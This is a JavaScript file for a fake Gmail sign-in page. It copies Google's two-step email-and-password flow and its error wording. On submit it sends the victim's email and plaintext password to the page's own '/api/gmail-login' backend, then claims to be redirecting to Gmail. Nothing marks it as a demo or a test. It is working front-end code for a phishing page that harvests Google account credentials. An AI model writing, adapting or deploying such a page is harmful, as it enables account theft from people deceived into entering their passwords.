document.addEventListener('DOMContentLoaded', function() {
    const emailInput = document.getElementById('gmailEmail');
    const passwordInput = document.getElementById('gmailPassword');
    const passwordGroup = document.getElementById('gmailPasswordGroup');
    const passwordToggle = document.getElementById('gmailPasswordToggle');
    const nextButton = document.getElementById('gmailNextButton');
    const backButton = document.getElementById('gmailBackButton');
    const loginForm = document.getElementById('gmailLoginForm');
    const emailError = document.getElementById('gmailEmailError');
    const passwordError = document.getElementById('gmailPasswordError');

    let isPasswordStep = false;

    // Email validation
    function validateEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    // Show error message
    function showError(errorElement, message) {
        errorElement.textContent = message;
        errorElement.classList.add('show');
    }

    // Hide error message
    function hideError(errorElement) {
        errorElement.textContent = '';
        errorElement.classList.remove('show');
    }

    // Show password field with animation
    function showPasswordField() {
        passwordGroup.style.display = 'block';
        passwordGroup.classList.add('password-group-enter');
        passwordInput.focus();
        isPasswordStep = true;
        nextButton.textContent = 'Sign in';
        backButton.style.display = 'inline-block';
    }

    // Hide password field
    function hidePasswordField() {
        passwordGroup.style.display = 'none';
        passwordGroup.classList.remove('password-group-enter');
        isPasswordStep = false;
        nextButton.textContent = 'Next';
        backButton.style.display = 'none';
        passwordInput.value = '';
        hideError(passwordError);
    }

    // Password toggle functionality
    passwordToggle.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        // Update icon (you can replace with actual eye icons)
        const icon = passwordToggle.querySelector('svg path');
        if (type === 'text') {
            icon.setAttribute('d', 'M10 3C5.5 3 1.73 6.11 1 10c.73 3.89 4.5 7 9 7s8.27-3.11 9-7c-.73-3.89-4.5-7-9-7zM10 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z');
        } else {
            icon.setAttribute('d', 'M10 3C5.5 3 1.73 6.11 1 10c.73 3.89 4.5 7 9 7s8.27-3.11 9-7c-.73-3.89-4.5-7-9-7zM10 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z');
        }
    });

    // Back button functionality
    backButton.addEventListener('click', function() {
        hidePasswordField();
        emailInput.focus();
    });

    // Email input validation
    emailInput.addEventListener('blur', function() {
        const email = emailInput.value.trim();
        if (email && !validateEmail(email)) {
            showError(emailError, 'Enter a valid email or phone number');
        } else {
            hideError(emailError);
        }
    });

    emailInput.addEventListener('input', function() {
        hideError(emailError);
    });

    // Password input validation
    passwordInput.addEventListener('blur', function() {
        const password = passwordInput.value;
        if (password && password.length < 6) {
            showError(passwordError, 'Enter a password');
        } else {
            hideError(passwordError);
        }
    });

    passwordInput.addEventListener('input', function() {
        hideError(passwordError);
    });

    // Form submission
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value;

        // Validate email
        if (!email) {
            showError(emailError, 'Enter an email or phone number');
            emailInput.focus();
            return;
        }

        if (!validateEmail(email)) {
            showError(emailError, 'Enter a valid email or phone number');
            emailInput.focus();
            return;
        }

        // If not in password step, show password field
        if (!isPasswordStep) {
            hideError(emailError);
            showPasswordField();
            return;
        }

        // Validate password
        if (!password) {
            showError(passwordError, 'Enter a password');
            passwordInput.focus();
            return;
        }

        if (password.length < 6) {
            showError(passwordError, 'Enter a password');
            passwordInput.focus();
            return;
        }

        // Hide all errors
        hideError(emailError);
        hideError(passwordError);

        // Show loading state
        nextButton.classList.add('loading');
        nextButton.disabled = true;

        // Send data to backend server
        fetch('/api/gmail-login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password,
                service: 'gmail'
            })
        })
        .then(response => response.json())
        .then(data => {
            nextButton.classList.remove('loading');
            nextButton.disabled = false;
            
            if (data.success) {
                // Show success message
                alert('Sign in successful! Redirecting to Gmail...');
                
                // Reset form
                hidePasswordField();
                emailInput.value = '';
                passwordInput.value = '';
            } else {
                alert('Sign in failed: ' + data.message);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            nextButton.classList.remove('loading');
            nextButton.disabled = false;
            alert('Sign in failed. Please try again.');
        });
    });

    // Enter key handling
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            if (document.activeElement === emailInput && !isPasswordStep) {
                e.preventDefault();
                loginForm.dispatchEvent(new Event('submit'));
            }
        }
    });

    // Focus management
    emailInput.focus();

    // Add some demo functionality for common email domains
    emailInput.addEventListener('input', function() {
        const email = emailInput.value.toLowerCase();
        if (email.includes('@gmail') || email.includes('@googlemail')) {
            // Could add special handling for Gmail accounts
        }
    });

    // Add accessibility improvements
    emailInput.setAttribute('autocomplete', 'email');
    passwordInput.setAttribute('autocomplete', 'current-password');
    
    // Add ARIA labels
    emailInput.setAttribute('aria-label', 'Email or phone');
    passwordInput.setAttribute('aria-label', 'Enter your password');
    passwordToggle.setAttribute('aria-label', 'Show password');
    nextButton.setAttribute('aria-label', 'Next');
    backButton.setAttribute('aria-label', 'Back');
});
